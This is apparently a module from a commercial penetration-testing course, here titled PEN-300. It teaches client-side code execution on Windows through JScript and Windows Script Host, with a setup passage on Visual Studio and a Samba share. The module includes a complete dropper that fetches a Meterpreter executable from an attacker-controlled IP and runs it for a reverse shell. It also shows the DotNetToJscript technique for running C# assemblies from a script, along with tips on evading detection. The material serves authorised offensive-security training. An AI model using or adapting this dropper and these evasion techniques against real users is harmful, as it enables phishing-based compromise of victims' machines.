### PEN-300

An advanced penetration testing course. It builds on the knowledge and techniques taught in PEN-200, teaching students to perform advanced penetration tests against mature organizations with an established security function.

1.  [Courses](https://portal.offsec.com/library/courses)
2.  Evasion Techniques and Breaching Defenses

(access will end on **March 1st 2025, 08:00 AM**. )

Training material

Challenge Labs

Exam

PEN-300: 5. Client Side Code Execution With Windows Script Host

5\. Client Side Code Execution With Windows Script Host

5.1. Creating a Basic Dropper in Jscript

5.1.1. Execution of Jscript on Windows

5.1.2. Jscript Meterpreter Dropper

5.2.1. Introduction to Visual Studio

5.2.3. Win32 API Calls From C#

5.2.4. Shellcode Runner in C#

5.2.5. Jscript Shellcode Runner

5.3. In-memory PowerShell Revisited

As discussed in the previous module, Microsoft Office VBA macros are an effective and popular way to gain client-side code execution. However, JavaScript attachments are equally effective for this task, and have recently gained in popularity.<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_632-1" id="fnref-local_id_632-1">1</a></sup>

In this module, we'll use the _Jscript_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_632-2" id="fnref-local_id_632-2">2</a></sup> file format to execute Javascript on Windows targets through the Windows Script Host.<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_632-3" id="fnref-local_id_632-3">3</a></sup> Specifically, we will use these _Jscript droppers_ to execute powerful client-side attacks.

Examples of recent advanced Jscript-based malware strains include _TrickBot_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_632-4" id="fnref-local_id_632-4">4</a></sup> and _Emotet_,<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_632-5" id="fnref-local_id_632-5">5</a></sup> both of which are under constant development.

We'll begin with a simple dropper that opens a command prompt and gradually improve our attack by reflectively loading pre-compiled C# assembly to execute our shellcode runner completely in memory.

Let's begin with a foundational discussion about the JavaScript language.

<sup>1</sup>

(Sophos, 2019), https://www.sophos.com/en-us/security-news-trends/security-trends/malicious-javascript.aspx [↩︎](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fnref-local_id_632-1)

<sup>2</sup>

(Wikipedia, 2019), https://en.wikipedia.org/wiki/JScript [↩︎](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fnref-local_id_632-2)

<sup>4</sup>

(Bromium, 2019), https://www.bromium.com/deobfuscating-ostap-trickbots-javascript-downloader/ [↩︎](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fnref-local_id_632-4)

<sup>5</sup>

(Security Soup, 2019), https://security-soup.net/a-quick-look-at-emotets-updated-javascript-dropper/ [↩︎](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fnref-local_id_632-5)

## 5.1. Creating a Basic Dropper in Jscript

The primary client scripting language for web browsers is JavaScript, which is an interpreted language that is processed inside the browser and commonly works together with HTML and CSS to create most of the content on the World Wide Web. The functionality of JavaScript is based on the _ECMAScript_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_633-1" id="fnref-local_id_633-1">1</a></sup> standard.

Jscript is a dialect of JavaScript developed and owned by Microsoft that is used in Internet Explorer. It can also be executed outside the browser through the _Windows Script Host_,<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_633-2" id="fnref-local_id_633-2">2</a></sup> which can execute scripts in a variety of languages.

When executed outside of a web browser, Jscript is not subject to any of the security restrictions enforced by a browser sandbox. This means we can use it as a client-side code execution vector without exploiting any vulnerabilities.

<sup>1</sup>

(Wikipedia, 2019), https://en.wikipedia.org/wiki/ECMAScript [↩︎](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fnref-local_id_633-1)

### 5.1.1. Execution of Jscript on Windows

In order to use a file type in a phishing attack, it must be easily executable. For this reason, some file types are better suited for phishing attacks than others. To demonstrate this, let's inspect PowerShell and Jscript files on our victim machine and see how they are handled by Windows.

In Windows, a file's format is identified by the file extension and not its actual content. Additionally, file extensions are often associated with default applications. To view these associations, we can navigate to _Settings_ > _Apps_ > _Default apps_, scroll to the bottom, and click on _Choose default apps by file type_ as displayed in Figure 1.

![Figure 1: Default apps by file type](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/2ddfb0ae33915712018cfdd11657e2a1-cscej_jscript_fileformat.png)

Figure 1: Default apps by file type

Scrolling down the list, we notice that the default application for PowerShell scripting files (.ps1) is Notepad. This means that if we double-click on a PowerShell script, it will not be executed but instead will be opened for editing in Notepad. Because of this, even if we were able to convince the victim to double-click a PowerShell file, it would not be executed.

On the other hand, the default application for .js files is the Windows-Based Script Host. This means that if we double-click a .js file, the content will be executed.

As mentioned previously, executing Jscript outside the context of a web browser bypasses all security settings. This allows us to interact with the older _ActiveX_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_634-1" id="fnref-local_id_634-1">1</a></sup> technology and the Windows Script Host engine itself. Let's discuss what we can do with this combination.

As shown in the code in Listing 1, we can leverage ActiveX by invoking the _ActiveXObject_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_634-2" id="fnref-local_id_634-2">2</a></sup> constructor by supplying the name of the object. We can then use _WScript.Shell_ to interact with the Windows Script Host Shell to execute external Windows applications. For example, we can instantiate a _Shell_ object named "shell" from the _WScript.Shell_ class through the _ActiveXObject_ constructor to run cmd.exe through the _Run_ command:

```
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```

> Listing 1 - Jscript launching cmd.exe through ActiveX

After saving the code to a file with the .js extension and double-clicking it, the script is executed and launches a command prompt. The Windows Script Host itself exits as soon as the Jscript file is complete so we don't see it in Process Explorer.

In the next section, we'll build upon this to create a Jscript dropper that will execute a Meterpreter reverse shell.

#### Exercises

1.  Create a simple Jscript file that opens an application.
2.  Look through the list of default applications related to file types. Are there any other interesting file types we could leverage?
3.  The .vbs extension is also linked to the Windows Script Host format. Write a simple VBScript file to open an application.

<sup>1</sup>

(Wikipedia, 2019), https://en.wikipedia.org/wiki/ActiveX [↩︎](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fnref-local_id_634-1)

### 5.1.2. Jscript Meterpreter Dropper

Next, we'll expand our usage of Jscript to create a dropper that downloads a Meterpreter executable from our Kali Linux web server and executes it. This will require several components.

First, we'll use _msfvenom_ to generate a 64-bit Meterpreter reverse HTTPS executable named met.exe and save it to our Kali web root. We'll also set up a Metasploit multi/handler to catch the session.

With our executable generated and our handler waiting, let's begin building our dropper code. We'll start with a simple HTTP GET request from Jscript.

To do that, we can use the _MSXML2.XMLHTTP_ object, which is based on the Microsoft XML Core Services,<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-1" id="fnref-local_id_635-1">1</a></sup> and its associated HTTP protocol parser. This object provides client-side protocol support to communicate with HTTP servers. Although it is not documented, it is present in all modern versions of Windows.

As shown in Listing 2, we can use the _CreateObject_ method of the Windows Script Host to instantiate the _MSXML2.XMLHTTP_ object, and then use _Open_ and _Send_ methods to perform an HTTP GET request. The _Open_ method takes three arguments. The first is the HTTP method, which in our case is GET. The second argument is the URL, and the third argument indicates that the request should be synchronous.

To summarize our code, we'll use the (_url_) variable to set the URL of the Meterpreter executable. Then we'll create a Windows Script _MSXML2.XMLHTTP_ object and call the _Open_ method on that object to specify a GET request along with the URL. Finally, we'll send the GET request to download the file.

```
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

> Listing 2 - HTTP GET request from Jscript

Now that we have sent the HTTP GET request, we'll perform two actions. The first is to detect if the request was successful. This can be done by checking the _Status_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-2" id="fnref-local_id_635-2">2</a></sup> property of the _MSXML2.XMLHTTP_ object and comparing it to the value "200", the HTTP _OK_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-3" id="fnref-local_id_635-3">3</a></sup> status code. We can do this with an _if_ statement:

```
if (Object.Status == 200)
{
```

> Listing 3 - Checking the HTTP status

After receiving a successful status, we'll create a _Stream_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-4" id="fnref-local_id_635-4">4</a></sup> object and copy the HTTP response into it for further processing. The _Stream_ object is instantiated from _ADODB.Stream_ through the _CreateObject_ method.

```
var Stream = WScript.CreateObject('ADODB.Stream');
```

> Listing 4 - Creating a Stream object

Next, we'll invoke _Open_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-5" id="fnref-local_id_635-5">5</a></sup> on the _Stream_ object and begin editing the properties of the stream. First, we'll set the _Type_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-6" id="fnref-local_id_635-6">6</a></sup> property (_adTypeBinary_) to "1" to indicate we are using binary content.

Next, we'll call the _Write_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-7" id="fnref-local_id_635-7">7</a></sup> method to save the _ResponseBody_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-8" id="fnref-local_id_635-8">8</a></sup> (our Meterpreter executable) to the stream.

Finally, we'll reset the _Position_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-9" id="fnref-local_id_635-9">9</a></sup> property to "0" to instruct the _Stream_ to point to the beginning of its content.

```
Stream.Open();
Stream.Type = 1; // adTypeBinary
Stream.Write(Object.ResponseBody);
Stream.Position = 0;
```

> Listing 5 - Writing the Stream object

So far, we have sent a GET request for our met.exe file, and have validated that the request was successful. Next, we wrote the binary content to our ADODB stream. Now, with the content stored in the _Stream_ object, we must create a file and write the binary content to it. As shown in Listing 6, we can use the _SaveToFile_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-10" id="fnref-local_id_635-10">10</a></sup> method.

This method takes two arguments: the first is the filename and second are the save options, _SaveOptionsEnum_. We'll set the filename to met.exe and set the _SaveOptionsEnum_ to _adSaveCreateOverWrite_, with the numerical value of "2" to force a file overwrite. After we perform the _SaveToFile_ action, we need to _Close_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-11" id="fnref-local_id_635-11">11</a></sup> the _Stream_ object:

```
Stream.SaveToFile("met.exe", 2);
Stream.Close();
```

> Listing 6 - Saving the Meterpreter executable to disk

As a final step, we'll reuse the Windows Script Host Shell to execute the newly written Meterpreter executable.

```
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

> Listing 7 - Running the Meterpreter executable

The complete Jscript code to download and execute our Meterpreter shell is displayed below in Listing 8.

```
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

> Listing 8 - Complete Jscript code to download and execute Meterpreter shell

After saving this code as a .js file, all we need to do is double-click it to get a 64-bit shell from the victim's machine to our awaiting multi/handler listener.

Now that we've covered the basics of Jscript, we'll again expand our tradecraft to implement an in-memory shellcode runner. Sadly, there is no way to implement this directly in Jscript so we must rely on a second language.

#### Exercises

1.  Replicate the Jscript file from this section.
2.  Modify the Jscript code to make it proxy-aware with the _setProxy_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_635-12" id="fnref-local_id_635-12">12</a></sup> method. You can use the Squid proxy server installed on the Windows 10 development machine.

## 5.2. Jscript and C#

To improve our Jscript tradecraft, and run our payload completely from memory, we'll again invoke Win32 APIs just as we did in the Microsoft Office module.

Previously, we used PowerShell for this. However, since PowerShell has been used for many years by both penetration testers and malware authors, security solution providers (Microsoft included) have tried to take steps against malicious use of it. In this module, we will instead leverage C# which has, until recently, not been in the spotlight. This could reduce our profile and may help avoid detection.

Since there's no known way to invoke the Win32 APIs directly from Jscript, we'll instead embed a compiled C# assembly in the Jscript file and execute it. This will give us the same capabilities as PowerShell since we will have comparable access to the .NET framework. This is a powerful technique that has recently gained a lot of attention and popularity.

Before we build this, let's cover some basics of the C# development environment (_Visual Studio_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_636-1" id="fnref-local_id_636-1">1</a></sup>), which is already installed on the Windows 10 development machine.

### 5.2.1. Introduction to Visual Studio

There are two primary integrated development environments (IDE)<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_637-1" id="fnref-local_id_637-1">1</a></sup> focused on developing and compiling C# applications: Mono<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_637-2" id="fnref-local_id_637-2">2</a></sup> and Microsoft Visual Studio. In this course, we will leverage Visual Studio, but most (if not all) code examples will also compile with Mono.

Visual Studio is already installed on the Windows 10 development machine, but when it is reverted, all previously written code will be lost. To solve this issue, we'll create a Kali _Samba_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_637-3" id="fnref-local_id_637-3">3</a></sup> share for our code to save our code between system reverts.

To set up Samba on Kali, we'll install it with apt, make a backup of its configuration file (smb.conf), and create a fresh configuration file as shown in Listing 9.

```
kali@kali:~$ <span>sudo apt install samba</span>
...
kali@kali:~$ <span>sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old</span>

kali@kali:~$ <span>sudo nano /etc/samba/smb.conf</span>
```

> Listing 9 - Installing Samba on Kali Linux

We'll create the new simple SMB configuration file with the contents given in Listing 10. If we choose to use a different user account, we can simply alter the path variable:

```
[visualstudio]
 path = /home/kali/data
 browseable = yes
 read only = no
```

> Listing 10 - New content of smb.conf

Next, we need to create a samba user that can access the share and then start the required services as shown below:

```
kali@kali:~$ <span>sudo smbpasswd -a kali</span>
New SMB password:
Retype new SMB password:
Added user kali.

kali@kali:~$ <span>sudo systemctl start smbd</span>

kali@kali:~$ <span>sudo systemctl start nmbd</span>
```

> Listing 11 - Creating SMB user and starting services

Finally, we'll create the shared folder and open up the permissions for Visual Studio:

```
kali@kali:~$ <span>mkdir /home/kali/data</span>

kali@kali:~$ <span>chmod -R 777 /home/kali/data</span>
```

> Listing 12 - Creating the shared folder and setting permissions

With everything set up, we'll turn to our Windows 10 development machine. First, we'll open the new share in File Explorer (\\\\192.168.119.120 in our case). When prompted, we'll enter the username and password of the newly created SMB user and select the option to store the credentials.

Now that our environment is set up, let's create a new "Hello World" project. We'll launch Visual Studio from the taskbar and choose _Create a new project_ from the splash screen.

Next, we'll set the _Language_ drop down menu to C# and select _Console App (.NET Framework)_ as shown in Figure 2.

![Figure 2: Selecting a C# Console App](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/47801a4972adb0b1fc7913221e33fb7b-cscej_visual_new.png)

Figure 2: Selecting a C# Console App

After selecting the project type and clicking next, we must set the _Location_ of the project. In our case, we'll use the visualstudio folder on our network share. For the remaining options, we'll accept the default values and click _Create_. It may take some time to create the project.

Once Visual Studio opens, we'll find that we've created both a _solution_ and a project. The solution is a parent unit that may contain multiple projects.

Let's take a moment to examine the basic workspace configuration. The first window to make note of is the _Solution Explorer_ on the far right side, which can be thought of as the file and property explorer for the solution's contents. Here we can see the source code file related to the current project, which in our case is named Program.cs as highlighted in Figure 3.

![Figure 3: Using Solution Explorer](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/6b287ee5b6d82c671e2a67f596ff14c9-cscej_visual_program.png)

Figure 3: Using Solution Explorer

On the left side of the workspace, we can inspect the contents of the file selected in the Solution Explorer. By default, this view will show the contents of Program.cs. The code for a typical C# console application is shown in Listing 13.

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
```

> Listing 13 - Default program stub for a C# console application

Let's highlight significant parts of the code. As shown in Listing 13, the first five lines contain _using_ statements. These statements import the codebase from the .NET framework. Next, the _Main_ method defines the entry point of our application when it is compiled.

Let's add a line of code inside the _Main_ method to create our simple application. We will use the _Console.WriteLine_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_637-4" id="fnref-local_id_637-4">4</a></sup> method to print some text to the console when the application is executed.

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            <span>Console.WriteLine("Hello World");</span>
        }
    }
}
```

> Listing 14 - Adding the call to Console.WriteLine

With our code added, we can save the changes with either _File_ > _Save Program.cs_ or C+s. Next, we'll modify the default solution settings before we compile our code. We'll switch from _Debug_ mode to _Release_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_637-5" id="fnref-local_id_637-5">5</a></sup> mode to remove the debugging information that could trigger some security scanning software (Figure 4).

![Figure 4: Choosing between Debug and Release mode](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/6ff04fbca3d7fb540f5447c797e8371e-cscej_visual_debug.png)

Figure 4: Choosing between Debug and Release mode

We can now compile our application by navigating to _Build_ > _Build Solution_ or _Build_ > _Build ConsoleApp1_, which will compile the whole solution or just the current project, respectively. Whether the compilation succeeds or fails, we can view the output in the _Output_ window at the bottom of Visual Studio (Figure 5).

![Figure 5: Output of the build process](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/f03d5a658984858222d13459819507e8-cscej_visual_output1.png)

Figure 5: Output of the build process

Fortunately, our code compiled without any issues. The compilation output also tells us the path to the newly compiled executable. In our particular example, it saved to the following path:

```
\\192.168.119.120\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe
```

> Listing 15 - The path to our new executable

We can now open a command prompt on our Windows machine and enter this path to execute our new program. After a few seconds, we are presented with "Hello World" as shown in Listing 16.

```
C:\Users\Offsec&gt; <span>\\192.168.119.120\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe</span>
Hello World
```

> Listing 16 - Executing the Hello World application

#### Exercises

1.  Set up the Samba share on your Kali system as shown in this section.
2.  Create a Visual Studio project and follow the steps to compile and execute the "Hello World" application.

### 5.2.2. DotNetToJscript

Now that we've discussed the basics of Visual Studio, let's introduce C# code into our Jscript.

In 2017, security researcher _James Forshaw_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_638-1" id="fnref-local_id_638-1">1</a></sup> created the _DotNetToJscript_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_638-2" id="fnref-local_id_638-2">2</a></sup> project that demonstrated how to execute C# assembly from Jscript. In this section, we'll use this technique to create our in-memory shellcode runner.

First, we need to download the DotNetToJscript project from GitHub or use the version stored locally at C:\\Tools\\DotNetToJscript-master.zip on the Windows 10 development machine. We'll extract it, copy it to our Kali Samba share, and open it in Visual Studio.

When opening the Visual Studio solution from a remote location, a security warning, similar to the one below, prompts us asking if we really want to open it.

![Figure 6: Security warning when opening a remote project](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/39212ce54d91a51329f441241c57c8b5-cscej_visual_remote.png)

Figure 6: Security warning when opening a remote project

The security warning raises awareness about the potential for malicious code in configuration files that could lead to arbitrary code execution. Essentially, a remote project can become a client side code execution vector.

When opening the Visual Studio project, ensure that the Samba path matches that of your Kali system and accept the security warnings.

Once we've opened DotNetToJscript in Visual Studio, we'll navigate to the Solution Explorer and open TestClass.cs under the _ExampleAssembly_ project.

We'll compile this as a .dll assembly, which we'll execute in Jscript. This simple project will display a "Test" message box.

```
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        <span>MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);</span>
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

> Listing 17 - The default ExampleAssembly code

Jscript will eventually execute the content of the _TestClass_ method, which is inside the _TestClass_ class. In this case, we are simply executing the _MessageBox.Show_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_638-3" id="fnref-local_id_638-3">3</a></sup> method.

Notice that the Solution Explorer lists a second project (DotNetToJscript) that converts the assembly into a format that Jscript can execute.

At this point, let's switch from Debug to Release mode and compile the entire solution with _Build_ > _Build Solution_.

When the solution is compiled, we need to move some files to get DotNetToJscript to work correctly. We'll navigate to the DotNetToJScript folder and copy DotNetToJscript.exe and NDesk.Options.dll to the C:\\Tools folder on the Windows 10 development machine. Then we'll go to the ExampleAssembly folder and also copy ExampleAssembly.dll to C:\\Tools. Note that these .dll files must be in place whenever we execute a DotNetToJscript program.

After copying the required files, we'll open a command prompt on our Windows machine and navigate to the C:\\Tools folder.

We need to set a few options at runtime. First, we'll specify the script language to use (JScript) with \--lang along with \--ver to specify the .NET framework version. On the newest versions of Windows 10, only version 4 of the .NET framework is installed and enabled by default, so we'll specify v4. Next, we'll specify the input file, which in our case is ExampleAssembly.dll. Finally, we'll use the \-o flag to specify the output file, in our case a Jscript file. The full command is shown in Listing 18.

```
C:\Tools&gt; <span>DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js</span>
```

> Listing 18 - Invoking DotNetToJscript to create a Jscript file

Now that the file is created, we can double-click it to run it. This displays our simple popup:

![Figure 7: Message box spawned by our Jscript file](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/c9b3d31d2966994eca9ac77913ca148c-cscej_dotnet_demo.png)

Figure 7: Message box spawned by our Jscript file

Let's examine the Jscript code generated by DotNetToJscript to get an idea of what, exactly happened. We'll open demo.js in a text editor to view this code.

This code begins with three functions: _setversion_, _debug_, and _base64ToStream_.

```
function <span>setversion()</span> {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function <span>debug(s)</span> {}
function <span>base64ToStream(b)</span> {
var enc = new ActiveXObject("System.Text.ASCIIEncoding");
var length = enc.GetByteCount_2(b);
var ba = enc.GetBytes_4(b);
var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform.TransformFinalBlock(ba, 0, length);
var ms = new ActiveXObject("System.IO.MemoryStream");
ms.Write(ba, 0, (length / 4) * 3);
ms.Position = 0;
return ms;
}
```

> Listing 19 - First helper functions of Jscript file

Let's examine each of these. The _setversion_ function configures the Windows Script Host to use version 4.0.30319 of the .NET framework:

```
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
```

> Listing 20 - First helper function

The second function (_debug_) is empty since we did not specify the debug flag (\-d) when invoking DotNetToJscript:

```
function debug(s) {}
```

> Listing 21 - Second helper function

Finally, the _base64ToStream_ function is simply a Base64 decoding function that leverages various .NET classes through ActiveXObject instantiation:

```
function base64ToStream(b) {
...
}
```

> Listing 22 - Third helper function

Following the helper functions, we find the main content of the script as shown in Listing 23.

```
var serialized_obj = "AAEAAAD/////AQAAAA...

var entry_class = 'TestClass';

try {
setversion();
var stm = base64ToStream(serialized_obj);
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var al = new ActiveXObject('System.Collections.ArrayList');
var d = fmt.Deserialize_2(stm);
al.Add(undefined);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

} catch (e) {
    debug(e.message);
}
```

> Listing 23 - Code to decode and deserialize the C# assembly

Let's analyze this code. First, a Base64 encoded binary blob is embedded into the file. This is our compiled C# assembly.

```
var serialized_obj = "AAEAAAD/////AQAAAA...
```

> Listing 24 - Base64 encoded binary blob

Next, we specify the name of the class inside the compiled assembly that we want to execute. In our case it's named _TestClass_:

```
var entry_class = 'TestClass';
```

> Listing 25 - Testclass variable

After specifying the name of the class, the heart of the script begins.

First, we set the .NET framework version and Base64-decode the blob as shown in Listing 26. Next, a _BinaryFormatter_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_638-4" id="fnref-local_id_638-4">4</a></sup> object is instantiated, from which we call the _Deserialize_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_638-5" id="fnref-local_id_638-5">5</a></sup> method. At this point, the _d_ variable contains the decoded and deserialized assembly ExampleAssembly.dll in memory.

```
setversion();
var stm = base64ToStream(serialized_obj);
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var d = fmt.Deserialize_2(stm);
```

> Listing 26 - Base64 decoded binary blob

To execute the relevant method inside the assembly, we'll use the _DynamicInvoke_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_638-6" id="fnref-local_id_638-6">6</a></sup> and _CreateInstance_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_638-7" id="fnref-local_id_638-7">7</a></sup> methods. DynamicInvoke accepts an array of arguments but no arguments are required by the constructor of the "TestClass" class.

We solve this by creating an array assigned to the "al" variable, then add an undefined object to keep it empty and convert it to an array through _ToArray()_. This creates an empty array which is passed to DynamicInvoke as shown in Listing 27.

```
var al = new ActiveXObject('System.Collections.ArrayList');
...
al.Add(undefined);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
```

> Listing 27 - DynamicInvoke code

Finally we execute the constructor through CreateInstance by supplying its name, which is stored in _entry\_class_.

Now, thanks to DotNetToJscript, we have the framework we can use to easily convert any C# code into a format that can be executed from a Jscript file. This brings us closer to having the ability to execute Win32 APIs.

#### Exercises

1.  Set up the DotNetToJscript project, share it on the Samba share, and open it in Visual Studio.
2.  Compile the default ExampleAssembly project and convert it into a Jscript file with DotNetToJscript.
3.  Modify the TestClass.cs file to make it launch a command prompt instead of opening a MessageBox.

### 5.2.3. Win32 API Calls From C#

With the simple example behind us, we'll now rehearse how to make calls to arbitrary Win32 APIs. We can leverage the _DllImport_ statement used in a previous module to import and link any Win32 APIs into C#. We'll need to once again translate the C-style argument data types to C# through the P/Invoke technique.

When calling Win32 APIs from PowerShell (in the previous module), we demonstrated the straightforward _Add-Type_ method and the more complicated reflection technique. However, the complexity of reflection was well worth it as we avoided writing C# source code and compiled assembly files temporarily to disk during execution. Luckily, when dealing with C#, we can compile the assembly before sending it to the victim and execute it in memory, which will avoid this problem.

Let's make a proof-of-concept example that imports _MessageBoxA_ and calls it from C#. To simplify this, we'll use the Visual Studio solution we created for the Hello World example.

